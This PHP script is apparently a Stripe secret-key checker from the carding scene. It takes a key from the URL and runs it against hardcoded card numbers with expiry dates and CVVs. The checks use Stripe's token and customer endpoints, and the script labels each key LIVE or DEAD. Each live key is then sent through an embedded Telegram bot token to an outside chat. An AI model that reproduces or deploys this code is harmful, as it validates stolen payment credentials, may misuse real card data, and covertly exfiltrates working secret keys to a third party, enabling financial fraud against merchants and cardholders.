<?php

error_reporting(0);
ini_set('display_errors', 0);

/*===[Setup]=====================*/
$sk = $_GET['sk'];

/*===[SK]========================*/
if($sk == ""){
    exit();
}

/*===[CC Info Randomizer]=================*/
$cc_info_arr[] = "4147202411104480|01|2024|919";
$cc_info_arr[] = "4427323412047246|03|2025|056";
$cc_info_arr[] = "5314620064182111|09|2028|405";
$cc_info_arr[] = "6011209825580930|03|2028|434";
$cc_info_arr[] = "4342562442889422|09|2026|217";
$cc_info_arr[] = "4403935008537641|11|2029|942";
$cc_info_arr[] = "4427323412680368|07|2025|788";
$cc_info_arr[] = "4924960341663904|11|2023|348";
$cc_info_arr[] = "4238161473838718|01|2026|458";
$cc_info_arr[] = "4659022794169029|10|2025|336";
$n = rand(0,9);
$cc_info = $cc_info_arr[$n];

/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");

/*===[ Auth 1 ]==============*/

$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch1, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
$curl1 = curl_exec($ch1);
curl_close($ch1);

/* One Response */
$res1 = json_decode($curl1, true);


/*===[ Auth 2 ]==============*/

if(isset($res1['id'])){
    /* Two */
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, "email=$email&description=Tikol4Life&source=".$res1["id"]);
    curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $curl2 = curl_exec($ch2);
    curl_close($ch2);

    /* Two Response */
    $res2 = json_decode($curl2, true);
    $cus = $res2['id'];
}

// echo ''.$res2.''

// ---------------------------------------------------- Hit To Telegram Start----------------------------
$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
$botToken = urlencode('6190237258:AAHUvG8uS3ezcg2bOjd3_Za0YKlkF_ErE0M');
$chatID = urlencode('-850313265');

$charged_message = "SK LIVE: $sk";

$sendcharged = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text=' . urlencode($charged_message) . '';

$max_retries = 3;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;
// ---------------------------------------------------- Hit To Telegram End-------------------------------



/*===[Response]=======================*/

if(isset($res1['error'])){

    if ($res1['error']['type'] == 'invalid_request_error' && strpos($res1['error']['message'], 'rate limit exceeded') !== false) {
        echo '<span class="badge badge-success" style="background-color:#440076;"><b>#RATE LIMITED</b></span> <font style="color:#fff700;"><b>'.$sk.'</b><br>';
    }
    
    elseif ($res1['error']['type'] == 'invalid_request_error') {
        echo '<span class="badge badge-danger"><b>#DEAD</b></span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
    }

    else{
    
        if (isset($res2['error']['code']) && $res2['error']['code'] === 'testmode_charges_only') {
            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
        } else {
            echo '<span class="badge badge-success"><b>#LIVE</b></span> <font style="color:#67ff00;"><b>'.$sk.'</b><br>';
            while (!$sendchargedtotg && $num_retries < $max_retries) {
                $sendchargedtotg = @file_get_contents($sendcharged);
                $num_retries++;
            }
      
        }
    }
    
}else{

    if(isset($res2['error'])){
        
        if ($res1['error']['type'] == 'invalid_request_error' && $res1['error']['code'] == 'rate_limit') {
            echo '<span class="badge badge-success" style="background-color:#440076;"><b>#RATE LIMITED</b></span> <font style="color:#fff700;"><b>'.$sk.'</b><br>';
    } 
    
    elseif ($res1['error']['type'] == 'invalid_request_error') {
        echo '<span class="badge badge-danger"><b>#DEAD</b></span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
    }

    else{
        if (isset($res2['error']['code']) && $res2['error']['code'] === 'testmode_charges_only') {
            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
        } else {
            echo '<span class="badge badge-success"><b>#LIVE</b></span> <font style="color:#67ff00;"><b>'.$sk.'</b><br>';
            while (!$sendchargedtotg && $num_retries < $max_retries) {
                $sendchargedtotg = @file_get_contents($sendcharged);
                $num_retries++;
            }
        }
    }
//'.$curl1.''.$curl2.'
    }
    else{
       
        
        if (isset($res2['error']['code']) && $res2['error']['code'] === 'testmode_charges_only') {
            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
        } else {
            echo '<span class="badge badge-success"><b>#LIVE</b></span> <font style="color:#67ff00;"><b>'.$sk.'</b><br>';
            while (!$sendchargedtotg && $num_retries < $max_retries) {
                $sendchargedtotg = @file_get_contents($sendcharged);
                $num_retries++;
            }
        }
    }
}

/*===[PHP Functions]==========================================*/
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@yahoo.com';
}
?>